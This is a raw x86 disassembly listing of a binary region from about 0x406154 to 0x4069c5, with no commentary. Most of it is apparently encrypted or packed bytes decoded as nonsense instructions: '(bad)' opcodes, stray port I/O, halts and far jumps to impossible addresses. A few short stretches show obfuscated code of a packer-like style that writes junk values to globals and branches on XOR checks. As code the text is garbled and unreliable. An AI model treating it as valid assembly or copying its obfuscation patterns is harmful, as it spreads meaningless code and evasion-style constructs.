  406154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406155:	enter  0xfb2f,0x6f
  406159:	jp     0x4060ed
  40615b:	jg     0x4061ae
  40615d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40615e:	dec    ecx
  40615f:	loop   0x406102
  406161:	add    al,0x42
  406163:	ja     0x406126
  406165:	add    al,0xaa
  406167:	xor    eax,0xd86f1ae0
  40616c:	xchg   BYTE PTR [eax],cl
  40616e:	sbb    eax,0x22375f79
  406173:	imul   BYTE PTR [ecx*4-0x2a1663ad]
  40617a:	adc    dh,BYTE PTR [edx-0x71064cbd]
  406180:	(bad)  
  406181:	fwait
  406182:	push   ds
  406183:	or     eax,0x148edf42
  406188:	xchg   esp,eax
  406189:	cmp    eax,esi
  40618b:	aad    0xb3
  40618d:	out    0x81,eax
  40618f:	sbb    ecx,DWORD PTR [esi]
  406191:	mov    ebx,0x93a0cb0
  406196:	pop    esi
  406197:	push   ecx
  406198:	es mov ah,0xf2
  40619b:	jmp    0x897fcadf
  4061a0:	pop    edx
  4061a1:	test   esp,ebp
  4061a3:	sbb    dl,BYTE PTR ds:0x1cac5312
  4061a9:	sbb    DWORD PTR [edi+ecx*8],esi
  4061ac:	nop
  4061ad:	inc    BYTE PTR [ebx]
  4061af:	push   es
  4061b0:	mov    bh,0x94
  4061b2:	popa   
  4061b3:	mov    ecx,0xf9a7861b
  4061b8:	push   0x7c
  4061ba:	in     al,0xd8
  4061bc:	call   0x7ff7:0x33b13bc3
  4061c3:	out    0xad,al
  4061c5:	and    al,0x12
  4061c7:	lahf   
  4061c8:	in     eax,dx
  4061c9:	cli    
  4061ca:	clc    
  4061cb:	sub    edi,DWORD PTR ds:[edi+0x6f]
  4061cf:	or     esp,ebp
  4061d1:	push   edi
  4061d2:	and    dl,BYTE PTR [eax+0x6a]
  4061d5:	adc    dl,cl
  4061d7:	add    eax,0x6a0e61e8
  4061dc:	xchg   edx,eax
  4061dd:	add    al,0x7f
  4061df:	mov    eax,ds:0xb5d89be2
  4061e4:	js     0x4061ff
  4061e6:	mov    cl,0x3e
  4061e8:	out    dx,eax
  4061e9:	inc    ecx
  4061ea:	jecxz  0x4061cb
  4061ec:	pusha  
  4061ed:	fs in  al,0x58
  4061f0:	mov    edx,0x269b0c21
  4061f5:	push   esi
  4061f6:	loopne 0x406277
  4061f8:	daa    
  4061f9:	(bad)  
  4061fa:	aad    0x67
  4061fc:	test   eax,0xa727950a
  406201:	cmp    DWORD PTR [esi],eax
  406203:	adc    DWORD PTR [ecx+0x1c],0xc0f6eb5
  40620a:	mov    cs,WORD PTR [edx]
  40620c:	inc    edx
  40620d:	enter  0xed17,0x8e
  406211:	cwde   
  406212:	lds    esi,FWORD PTR [ebx-0x3f7805b1]
  406218:	adc    al,0x88
  40621a:	mov    fs,WORD PTR [eax+0x6b6d7cf6]
  406220:	ret    
  406221:	ror    DWORD PTR [ebx+0x4f],0x9c
  406225:	lahf   
  406226:	ins    BYTE PTR es:[edi],dx
  406227:	hlt    
  406228:	aas    
  406229:	pop    eax
  40622a:	mov    ecx,0x132c6418
  40622f:	cs pop ecx
  406231:	add    bh,BYTE PTR [ecx]
  406233:	jmp    0x5bf5:0xd0047f71
  40623a:	out    dx,al
  40623b:	xrelease mov DWORD PTR [esi+0x53],ebx
  40623f:	ss ds in eax,dx
  406242:	hlt    
  406243:	xabort 0x9b
  406246:	hlt    
  406247:	aas    
  406248:	ds mov ah,ah
  40624b:	aam    0x5b
  40624d:	xor    BYTE PTR [esp+edi*2+0x44],0xe
  406252:	(bad)  
  406253:	sti    
  406254:	dec    edx
  406255:	(bad)  
  406256:	fiadd  DWORD PTR cs:0x3d1af65e
  40625d:	inc    ebx
  40625e:	cmc    
  40625f:	loopne 0x4062b6
  406261:	and    eax,DWORD PTR [ecx+edi*1]
  406264:	call   0x9d0ace84
  406269:	pop    esi
  40626a:	aas    
  40626b:	xor    eax,0x527c176a
  406270:	rcl    bl,1
  406272:	cli    
  406273:	dec    edx
  406274:	inc    edx
  406275:	pop    es
  406276:	addr16 repnz mov esi,0xcb3c9e94
  40627d:	ret    
  40627e:	popa   
  40627f:	lds    esp,FWORD PTR ds:0x9b3c5325
  406285:	pop    edx
  406286:	int    0x22
  406288:	hlt    
  406289:	enter  0x7578,0xa
  40628d:	(bad)  
  40628e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40628f:	arpl   WORD PTR [ebx],sp
  406291:	jmp    0x1502:0xceaf849e
  406298:	cld    
  406299:	cld    
  40629a:	sbb    eax,DWORD PTR [esi-0x58]
  40629d:	repnz mov dh,0xd9
  4062a0:	mov    edi,0x19660965
  4062a5:	arpl   WORD PTR [edi-0x41],sp
  4062a8:	lods   al,BYTE PTR ds:[esi]
  4062a9:	in     eax,0x2e
  4062ab:	xor    eax,0xfecd523c
  4062b0:	enter  0x82ec,0xd1
  4062b4:	mov    cl,0x7e
  4062b6:	xchg   ecx,eax
  4062b7:	cmp    edx,ebx
  4062b9:	leave  
  4062ba:	add    BYTE PTR [esi],0x10
  4062bd:	mov    ss,WORD PTR [ebp-0x47af34aa]
  4062c3:	test   BYTE PTR [ecx],dl
  4062c5:	out    0x22,al
  4062c7:	cmp    eax,0x61d8d383
  4062cc:	int    0x70
  4062ce:	mov    ds:0xe97ae945,eax
  4062d3:	int3   
  4062d4:	(bad)  
  4062d5:	repnz add al,0x92
  4062d8:	xchg   edx,eax
  4062d9:	fwait
  4062da:	mov    eax,0xe1ac7077
  4062df:	fidiv  WORD PTR [ebx-0x234c0e19]
  4062e5:	rcr    cl,1
  4062e7:	push   ds
  4062e8:	hlt    
  4062e9:	call   0x9fb10319
  4062ee:	fldcw  WORD PTR [eax-0x53]
  4062f1:	out    dx,eax
  4062f2:	icebp  
  4062f3:	nop
  4062f4:	inc    ebp
  4062f5:	mov    edx,0x9b732e67
  4062fa:	or     dh,bh
  4062fc:	adc    al,0x66
  4062fe:	(bad)  [edx-0x2d321a9a]
  406304:	xor    DWORD PTR [ecx+0xf3db03a],ecx
  40630a:	(bad)  
  40630b:	lock adc eax,0xf4d66137
  406311:	sub    eax,0xbf851dde
  406316:	test   al,ah
  406318:	das    
  406319:	mov    esp,0x4a38e8d6
  40631e:	fild   DWORD PTR [edx-0x6]
  406321:	ss mov bh,0x19
  406324:	dec    ebp
  406325:	lahf   
  406326:	les    ecx,FWORD PTR [eax+0x3ce06cef]
  40632c:	iret   
  40632d:	lahf   
  40632e:	adc    eax,0xf5db8b3d
  406333:	or     eax,0x219dc6fa
  406338:	sahf   
  406339:	add    cl,ah
  40633b:	add    DWORD PTR [edx+0x79],eax
  40633e:	inc    ebp
  40633f:	jmp    FWORD PTR [ecx+ebx*1]
  406342:	mov    esp,0x1c17bd99
  406347:	lahf   
  406348:	js     0x406399
  40634a:	pop    es
  40634b:	push   ds
  40634c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40634d:	mov    ah,0xe6
  40634f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406350:	mov    eax,ds:0x85c67c3f
  406355:	sub    DWORD PTR [ecx],0x5e32c856
  40635b:	je     0x40632e
  40635d:	sahf   
  40635e:	cmp    BYTE PTR [esi],cl
  406360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406361:	popa   
  406362:	cs mov esi,0x69b956da
  406368:	xor    al,0xe9
  40636a:	push   ss
  40636b:	out    dx,al
  40636c:	test   al,0xa
  40636e:	and    ch,cl
  406370:	push   0x4b
  406372:	pop    ebp
  406373:	loope  0x4063af
  406375:	xchg   esp,eax
  406376:	out    dx,eax
  406377:	pop    ss
  406378:	pop    ebp
  406379:	pushf  
  40637a:	stos   DWORD PTR es:[edi],eax
  40637b:	sub    ecx,DWORD PTR [ebp-0x52ebfb09]
  406381:	aad    0x48
  406383:	xor    eax,0x9e1873cf
  406388:	icebp  
  406389:	stos   DWORD PTR es:[edi],eax
  40638a:	pop    edx
  40638b:	mov    BYTE PTR [eax+0x31342c85],0xa9
  406392:	add    al,0x10
  406394:	pop    ebx
  406395:	xor    eax,0x74b52fad
  40639a:	fs test al,0x81
  40639d:	cdq    
  40639e:	dec    ebx
  40639f:	xchg   DWORD PTR [esi+esi*8],esi
  4063a2:	sti    
  4063a3:	mov    ebp,0xe4d20027
  4063a8:	add    BYTE PTR [ebp-0x710cc11],ah
  4063ae:	dec    edx
  4063af:	fistp  DWORD PTR [esi+0x3f]
  4063b3:	pop    ebp
  4063b4:	mov    al,0xc1
  4063b6:	ret    0x6ff
  4063b9:	and    BYTE PTR ds:0x12234149,bl
  4063bf:	jae    0x4063bb
  4063c1:	inc    ecx
  4063c2:	dec    ebx
  4063c3:	scas   eax,DWORD PTR es:[edi]
  4063c4:	inc    ebp
  4063c5:	push   ebp
  4063c6:	jbe    0x4063a7
  4063c8:	xchg   BYTE PTR [edx-0x55],al
  4063cb:	mov    fs,eax
  4063cd:	rcr    DWORD PTR [edi-0x2b],0x11
  4063d1:	sbb    al,al
  4063d3:	jne    0x4063a3
  4063d5:	fwait
  4063d6:	or     dl,dh
  4063d8:	inc    edi
  4063d9:	push   ecx
  4063da:	sti    
  4063db:	out    0x3c,al
  4063dd:	ja     0x4063e2
  4063df:	push   ebp
  4063e0:	add    eax,0xa965193e
  4063e5:	and    ch,al
  4063e7:	and    esp,DWORD PTR ds:0x45dc7037
  4063ed:	or     BYTE PTR [edx],0xc3
  4063f0:	frstor [edi-0x4642488a]
  4063f6:	dec    esi
  4063f7:	les    esp,FWORD PTR [ebp-0x41]
  4063fa:	push   esi
  4063fb:	hlt    
  4063fc:	cmp    edi,edx
  4063fe:	sbb    ah,BYTE PTR [edi+0x5e]
  406401:	cmp    ch,BYTE PTR [edi]
  406403:	(bad)  [edx]
  406405:	fsin   
  406407:	cmp    ebp,DWORD PTR [ecx-0x65]
  40640a:	sar    DWORD PTR ds:0x81c12322,cl
  406410:	xchg   edx,eax
  406411:	and    al,0x1d
  406413:	(bad)  
  406414:	enter  0x56ad,0xf7
  406418:	mov    edi,0x38e810aa
  40641d:	add    BYTE PTR [esi-0x18],dl
  406420:	pop    ecx
  406421:	jbe    0x405c26
  406427:	pop    ebx
  406428:	mov    eax,0xf89c8532
  40642d:	pop    edi
  40642e:	pop    esi
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430586,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e862
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430592
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4305b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ef0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e862,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e85a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x1648926f]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	mov    ds:0x28e71555,al
  4064b2:	sbb    al,0x48
  4064b4:	in     eax,dx
  4064b5:	test   eax,0x9d94cfe2
  4064ba:	scas   al,BYTE PTR es:[edi]
  4064bb:	setbe  BYTE PTR [edx]
  4064be:	(bad)  
  4064bf:	pop    es
  4064c0:	dec    ecx
  4064c1:	dec    ecx
  4064c2:	out    dx,al
  4064c3:	mov    bl,0xd6
  4064c5:	fdivr  DWORD PTR [edi+0x34]
  4064c8:	setbe  BYTE PTR [ebx-0x7d683c5]
  4064cf:	xor    ah,BYTE PTR [ecx-0x328fef8d]
  4064d5:	int3   
  4064d6:	push   ebx
  4064d7:	lea    ebp,[eax+0x22c2c8ec]
  4064dd:	inc    edi
  4064de:	dec    ebx
  4064df:	xor    al,0xa2
  4064e1:	mov    gs,WORD PTR [esi+0x2f8be2ed]
  4064e7:	and    esp,ecx
  4064e9:	xor    eax,0x94c07f6a
  4064ee:	out    0xd3,al
  4064f0:	add    al,0x1c
  4064f2:	(bad)  [ecx-0x30]
  4064f5:	outs   dx,BYTE PTR ds:[esi]
  4064f6:	(bad)  
  4064f7:	jl     0x40650c
  4064f9:	dec    ebp
  4064fa:	cld    
  4064fb:	(bad)  
  4064fc:	inc    ebx
  4064fd:	sub    cl,BYTE PTR [ebp+0x6e]
  406500:	jg     0x40652e
  406502:	adc    eax,0xa695dd0e
  406507:	xchg   esi,eax
  406508:	sbb    bl,BYTE PTR ds:0x641c0462
  40650e:	(bad)  
  40650f:	fnsave [edi+0x4440bae7]
  406515:	pop    ebp
  406516:	int    0xc1
  406518:	ins    BYTE PTR es:[edi],dx
  406519:	xchg   esi,eax
  40651a:	or     edx,esp
  40651c:	fwait
  40651d:	push   0x72325c03
  406522:	mov    ecx,0xb3a57bd3
  406527:	adc    edx,eax
  406529:	jecxz  0x4064e1
  40652b:	neg    DWORD PTR [ebx+0xeb7ae5d]
  406531:	add    eax,0x7ef3814c
  406536:	data16 fwait
  406538:	sbb    eax,0x549df130
  40653d:	rol    BYTE PTR [ecx+0x3e],cl
  406540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406541:	add    edx,DWORD PTR [ebp+edi*4-0x65501cff]
  406548:	add    ecx,DWORD PTR [ebp-0x37da3dc9]
  40654e:	push   ebx
  40654f:	inc    eax
  406550:	mov    ds:0x4a93ac0c,eax
  406555:	into   
  406556:	js     0x4064dd
  406558:	retf   0x9a0
  40655b:	sub    eax,DWORD PTR [esi+edx*1+0x6a]
  40655f:	repnz or eax,0x4394e97e
  406565:	mov    dl,0x77
  406567:	jle    0x4064f1
  406569:	mov    ds:0xc3d1864a,al
  40656e:	adc    DWORD PTR [edi+0x6f],0x6d
  406572:	out    0x89,al
  406574:	jle    0x406536
  406576:	jp     0x406507
  406578:	out    dx,eax
  406579:	add    DWORD PTR [eax+0x34c5cb03],0xffffffae
  406580:	xchg   edx,eax
  406581:	sub    al,0xee
  406583:	mov    edx,DWORD PTR [esi-0x7f]
  406586:	xchg   edi,eax
  406587:	cmp    esi,DWORD PTR [esp+ecx*2-0x21]
  40658b:	sbb    al,0x1a
  40658d:	fxch   st(5)
  40658f:	push   0x70
  406591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406592:	lods   eax,DWORD PTR ds:[esi]
  406593:	jmp    0x406613
  406595:	xor    cl,BYTE PTR [esi+0x3d0b7eb]
  40659b:	inc    DWORD PTR [esi-0x1316ebe1]
  4065a1:	dec    ebp
  4065a2:	imul   edi,DWORD PTR [eax+ecx*1],0x8
  4065a6:	neg    DWORD PTR [eax+0x4e821976]
  4065ac:	mov    ebx,0x7f54fa8e
  4065b1:	loop   0x4065a7
  4065b3:	mov    ebp,0x719c24af
  4065b8:	call   FWORD PTR [eax-0x66]
  4065bb:	or     dh,BYTE PTR [edx+0x38615ba6]
  4065c1:	sub    eax,0x67047f3f
  4065c6:	jns    0x40657f
  4065c8:	lahf   
  4065c9:	loopne 0x406617
  4065cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065cc:	gs mov ebp,0x75b31231
  4065d2:	or     ch,bh
  4065d4:	jns    0x4065f9
  4065d6:	cwde   
  4065d7:	inc    edi
  4065d8:	mov    dh,0x3e
  4065da:	mov    eax,ds:0xfa26f035
  4065df:	jno    0x406656
  4065e1:	pop    ds
  4065e2:	or     eax,0x6175e976
  4065e7:	rol    BYTE PTR [eax],1
  4065e9:	cwde   
  4065ea:	ret    
  4065eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065ec:	ins    DWORD PTR es:[edi],dx
  4065ed:	ss lahf 
  4065ef:	loopne 0x4065ed
  4065f1:	das    
  4065f2:	jle    0x4065a6
  4065f4:	mov    bh,0x96
  4065f6:	pop    es
  4065f7:	pop    ds
  4065f8:	rol    BYTE PTR [ebx],1
  4065fa:	mov    edx,0xa5f2b227
  4065ff:	lea    ecx,[edi-0x7d]
  406602:	ins    DWORD PTR es:[edi],dx
  406603:	pop    ss
  406604:	pop    ecx
  406605:	add    eax,0xc36cc495
  40660a:	inc    esi
  40660b:	mov    dl,0x3e
  40660d:	or     eax,0xf7b13cde
  406612:	add    al,0xac
  406614:	test   eax,0x351fa2c3
  406619:	xchg   ecx,eax
  40661a:	rcr    BYTE PTR [edx],1
  40661c:	xor    DWORD PTR [ebx],esp
  40661e:	jbe    0x40663d
  406620:	jp     0x406618
  406622:	jbe    0x4065ec
  406624:	xor    al,0x7e
  406626:	push   edx
  406627:	ins    DWORD PTR es:[edi],dx
  406628:	jle    0x40669a
  40662a:	push   esi
  40662b:	push   eax
  40662c:	add    DWORD PTR [ebx],ebx
  40662e:	lods   al,BYTE PTR cs:[esi]
  406630:	fisttp QWORD PTR [ecx]
  406632:	das    
  406633:	mov    eax,ds:0x1b8a15bc
  406638:	jne    0x406694
  40663a:	jbe    0x406694
  40663c:	hlt    
  40663d:	push   edx
  40663e:	test   eax,0x7b72edee
  406643:	jl     0x40662e
  406645:	sar    edi,cl
  406647:	adc    al,dl
  406649:	inc    esi
  40664a:	cmp    ebp,DWORD PTR [ebp+0x2ecef8dd]
  406650:	repnz adc cl,BYTE PTR [ecx-0x4c]
  406654:	push   ebx
  406655:	sub    al,0x14
  406657:	icebp  
  406658:	and    cl,BYTE PTR [ebx+0x1e]
  40665b:	(bad)  
  40665c:	arpl   WORD PTR [esi+0x36302b9e],dx
  406662:	mov    ebp,DWORD PTR [edi-0x6fd09e0e]
  406668:	push   esi
  406669:	add    eax,0x984b1952
  40666e:	jmp    0x4066a4
  406670:	xor    eax,0xdf505e15
  406675:	stc    
  406676:	bound  ebp,QWORD PTR [esi-0x7fa91e98]
  40667c:	fdivr  st,st(5)
  40667e:	jbe    0x40660b
  406680:	popf   
  406681:	stc    
  406682:	mov    dh,0x1e
  406684:	outs   dx,BYTE PTR ds:[esi]
  406685:	lea    edx,[edx+0x67]
  406688:	adc    al,0x98
  40668a:	retf   
  40668b:	and    al,0x4e
  40668d:	xchg   ebp,eax
  40668e:	repnz mov ah,0xee
  406691:	out    dx,al
  406692:	loope  0x4066a4
  406694:	addr16 mov edi,0xb8ce8db2
  40669a:	mov    edx,0xa4cb0015
  40669f:	daa    
  4066a0:	fldln2 
  4066a2:	mov    esp,0x50451426
  4066a7:	(bad)  
  4066a9:	inc    ebx
  4066aa:	es jno 0x406639
  4066ad:	loopne 0x406719
  4066af:	lea    esi,[ebp-0x3b]
  4066b2:	and    eax,0xbd716602
  4066b7:	mov    ds:0x2ade2310,eax
  4066bc:	dec    ebx
  4066bd:	xchg   esp,eax
  4066be:	test   DWORD PTR [edx],edx
  4066c0:	xor    DWORD PTR [edx-0x68010476],ecx
  4066c6:	les    edi,FWORD PTR [edx+0x75300714]
  4066cc:	js     0x40670a
  4066ce:	test   al,0xf5
  4066d0:	and    al,0x66
  4066d2:	arpl   WORD PTR [ebx+0x18a3992a],bx
  4066d8:	sahf   
  4066d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066da:	mov    esp,cs
  4066dc:	xor    ebx,DWORD PTR [ebx-0x7cb36dda]
  4066e2:	jl     0x406718
  4066e4:	ror    eax,cl
  4066e6:	push   ss
  4066e7:	aaa    
  4066e8:	ret    
  4066e9:	adc    al,0x7d
  4066eb:	inc    edi
  4066ec:	dec    ecx
  4066ed:	imul   esi,DWORD PTR [edx+ebp*1+0xb7072ac],0xb16dcf2e
  4066f8:	sahf   
  4066f9:	push   ss
  4066fa:	fsub   DWORD PTR [esi+0x17]
  4066fd:	pop    es
  4066fe:	int3   
  4066ff:	lahf   
  406700:	and    dl,BYTE PTR [esi+0x39]
  406703:	pop    es
  406704:	cld    
  406705:	mov    eax,ds:0xd1966cbf
  40670a:	pop    edx
  40670b:	gs mov cl,bl
  40670e:	xor    ebp,esp
  406710:	int    0x9
  406712:	mov    ecx,0xe588c088
  406717:	add    DWORD PTR [esi+ecx*4-0x1b],0x194cb83d
  40671f:	push   es
  406720:	aad    0xda
  406722:	mov    esi,0xc94ec5b
  406727:	inc    eax
  406728:	jmp    0x5b85:0x9bd961ae
  40672f:	jle    0x406743
  406731:	mov    ecx,0x5948fee4
  406736:	gs int3 
  406738:	out    dx,eax
  406739:	sbb    BYTE PTR [esi],al
  40673b:	into   
  40673c:	popa   
  40673d:	lock lods al,BYTE PTR ds:[esi]
  40673f:	leave  
  406740:	inc    eax
  406741:	add    ch,bl
  406743:	in     eax,dx
  406744:	jae    0x40671e
  406746:	mov    WORD PTR [edx-0x3c],?
  406749:	dec    edx
  40674a:	and    eax,0x5792ea9
  40674f:	jmp    0x406778
  406751:	or     BYTE PTR [ebp+0x5e],al
  406754:	cmp    eax,0x4b906b45
  406759:	mov    eax,0xa8c2645b
  40675e:	adc    BYTE PTR [esi],ah
  406760:	and    al,0xd1
  406762:	adc    eax,DWORD PTR [ebx+eax*4+0x75]
  406766:	into   
  406767:	sbb    dl,dh
  406769:	out    dx,eax
  40676a:	push   esp
  40676b:	or     al,0xd0
  40676d:	test   DWORD PTR [ebp+0x5d],ebx
  406770:	loopne 0x406796
  406772:	inc    esp
  406773:	inc    ecx
  406774:	sbb    ah,BYTE PTR [eax-0x31fb4d18]
  40677a:	jne    0x406792
  40677c:	sub    bh,BYTE PTR [esi+0x72]
  40677f:	or     ch,BYTE PTR [eax+edx*1-0x2413634d]
  406786:	fs (bad) 
  406788:	xor    esi,DWORD PTR [esi+0x78]
  40678b:	js     0x40678c
  40678d:	cdq    
  40678e:	mov    edi,DWORD PTR ds:0x425e37d4
  406794:	scas   eax,DWORD PTR es:[edi]
  406795:	mov    dl,0x60
  406797:	adc    al,0xcb
  406799:	daa    
  40679a:	mov    bh,0xa
  40679c:	fidiv  DWORD PTR [edx+0x6aca9e3f]
  4067a2:	ss add eax,0x7e6262f1
  4067a8:	push   cs
  4067a9:	jo     0x406817
  4067ab:	inc    ecx
  4067ac:	test   BYTE PTR [esi+0x61],bh
  4067af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b0:	outs   dx,DWORD PTR ds:[esi]
  4067b1:	jg     0x4067c0
  4067b3:	xor    cl,BYTE PTR [ecx-0x119f1b99]
  4067b9:	xor    al,0x25
  4067bb:	adc    ebx,DWORD PTR [edx-0x19]
  4067be:	ror    DWORD PTR [ecx+0x43],1
  4067c1:	(bad)  
  4067c2:	or     eax,0xf27027f1
  4067c7:	pop    edi
  4067c8:	std    
  4067c9:	jae    0x4067cd
  4067cb:	ss mov ebp,0xfe0e70a3
  4067d1:	xchg   esp,eax
  4067d2:	shr    DWORD PTR ds:0xc7c83cfb,1
  4067d8:	adc    eax,0x7881e7d9
  4067dd:	inc    edi
  4067de:	cmp    edi,DWORD PTR [ebp+0x60]
  4067e1:	stos   BYTE PTR es:[edi],al
  4067e2:	(bad)  
  4067e3:	ja     0x40679c
  4067e5:	rcl    DWORD PTR [eax],0x85
  4067e8:	aad    0xe3
  4067ea:	cdq    
  4067eb:	xchg   esi,eax
  4067ec:	push   cs
  4067ed:	sbb    al,0xdc
  4067ef:	ds cmc 
  4067f1:	cdq    
  4067f2:	xlat   BYTE PTR ds:[ebx]
  4067f3:	sub    DWORD PTR [ecx-0x202334be],0x51
  4067fa:	push   ecx
  4067fb:	mov    edi,DWORD PTR [esi-0x12]
  4067fe:	push   esp
  4067ff:	pushf  
  406800:	and    ecx,DWORD PTR [ecx-0x16]
  406803:	push   ebp
  406804:	sbb    esi,edi
  406806:	popf   
  406807:	sahf   
  406808:	das    
  406809:	pop    eax
  40680a:	bound  ebp,QWORD PTR ss:[edi+0x14]
  40680e:	aaa    
  40680f:	mov    al,0xb2
  406811:	lods   al,BYTE PTR ds:[esi]
  406812:	and    al,0x16
  406814:	jmp    0x8be4:0xfb31446
  40681b:	jne    0x406829
  40681d:	sbb    DWORD PTR ds:0x42ef24,0x4305aa
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x430652,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ef1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43063e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4305ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430656,0x43059a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ef24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	sbb    al,0xe0
  406895:	xor    DWORD PTR [ebx+0x4b],edx
  406898:	ss jle 0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	xor    ah,al
  4068a1:	jbe    0x406859
  4068a3:	sub    al,0x45
  4068a5:	sub    eax,0x4821e2b
  4068aa:	sub    BYTE PTR [edx-0x4b123fea],bh
  4068b0:	retf   
  4068b1:	test   DWORD PTR [ebp+esi*4+0x31d03bad],0x5806a6a9
  4068bc:	(bad)  
  4068bd:	sbb    al,0x5a
  4068bf:	test   eax,0xad7ae2cf
  4068c4:	pop    eax
  4068c5:	and    ch,ah
  4068c7:	call   0x88197ea7
  4068cc:	stc    
  4068cd:	sub    ebp,DWORD PTR [ecx+ebp*1-0x405120a1]
  4068d4:	cmp    eax,0xc43a8d5c
  4068d9:	(bad)  
  4068da:	cli    
  4068db:	popa   
  4068dc:	pop    es
  4068dd:	dec    eax
  4068de:	scas   eax,DWORD PTR es:[edi]
  4068df:	or     al,0x7f
  4068e1:	mov    BYTE PTR [ebx],dh
  4068e3:	jb     0x40686f
  4068e5:	add    eax,edi
  4068e7:	mov    bl,0xe7
  4068e9:	xchg   ecx,eax
  4068ea:	mov    esi,0x1db14900
  4068ef:	ins    DWORD PTR es:[edi],dx
  4068f0:	sub    DWORD PTR [edi+0x2a9eba15],ebx
  4068f6:	or     DWORD PTR [ebx-0x10],edx
  4068f9:	aaa    
  4068fa:	lds    ebx,FWORD PTR [ecx+ebx*1]
  4068fd:	adc    eax,0xc3280e06
  406902:	xor    BYTE PTR [ebx+0x48],dh
  406905:	shr    BYTE PTR [edi-0x5fc566c7],cl
  40690b:	aas    
  40690c:	into   
  40690d:	cli    
  40690e:	out    0xd8,al
  406910:	cwde   
  406911:	jbe    0x40698f
  406913:	repnz fs mov esi,0x25b1c381
  40691a:	sbb    eax,0x188972f6
  40691f:	sbb    ch,BYTE PTR [edi+0x5f1b3468]
  406925:	mov    ch,0xf2
  406927:	add    eax,0xfd7f7af7
  40692c:	mov    esi,0x36bcb03
  406931:	ret    0x7dba
  406934:	lahf   
  406935:	jl     0x406960
  406937:	(bad)  
  406938:	inc    DWORD PTR [edi+0x0]
  40693b:	lock mov ds:0x4ed1bb41,eax
  406941:	std    
  406942:	imul   esp,DWORD PTR [eax-0x6c99ca7a],0x75500c18
  40694c:	fwait
  40694d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40694e:	cwde   
  40694f:	mov    gs,WORD PTR [edx-0x4e27071d]
  406955:	imul   esp,edx,0xc9768ae8
  40695b:	pusha  
  40695c:	sub    ebx,DWORD PTR [edi-0x6ba01628]
  406962:	lods   eax,DWORD PTR ds:[esi]
  406963:	minps  xmm2,XMMWORD PTR [eax+0x58de1065]
  40696a:	pop    esi
  40696b:	pop    esi
  40696c:	mov    bh,0x3b
  40696e:	fcomp  DWORD PTR [ebx-0x18]
  406971:	inc    ebx
  406972:	fisttp WORD PTR [ebx+0xf]
  406975:	daa    
  406976:	add    ah,0x55
  406979:	outs   dx,BYTE PTR cs:[esi]
  40697b:	lods   al,BYTE PTR ds:[esi]
  40697c:	popa   
  40697d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40697f:	mov    bl,0xcd
  406981:	fs sbb eax,0xfd269dd1
  406987:	pop    edx
  406988:	fisttp QWORD PTR [ebp+0x73845470]
  40698e:	xlat   BYTE PTR ds:[ebx]
  40698f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406990:	lea    ebx,[esi+ecx*1]
  406993:	repz cs pop ds
  406996:	adc    eax,eax
  406998:	fidiv  DWORD PTR [ebx+0x38]
  40699b:	xchg   ebp,eax
  40699c:	inc    esp
  40699d:	sbb    DWORD PTR [ecx],edi
  40699f:	not    DWORD PTR [ebp+0x5e7bbf5b]
  4069a5:	inc    ebx
  4069a6:	cld    
  4069a7:	mov    ebx,0x8058e298
  4069ac:	outs   dx,BYTE PTR ss:[esi]
  4069ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069af:	add    BYTE PTR [ebx],ah
  4069b1:	je     0x406972
  4069b3:	lds    ebp,FWORD PTR [esi+ebx*1+0x705e5de3]
  4069ba:	js     0x40698d
  4069bc:	imul   esi,DWORD PTR [esi+0x79],0xe176a0c6
  4069c3:	cld    
  4069c4:	stos   BYTE PTR es:[edi],al
  4069c5:	in     eax,0xb2
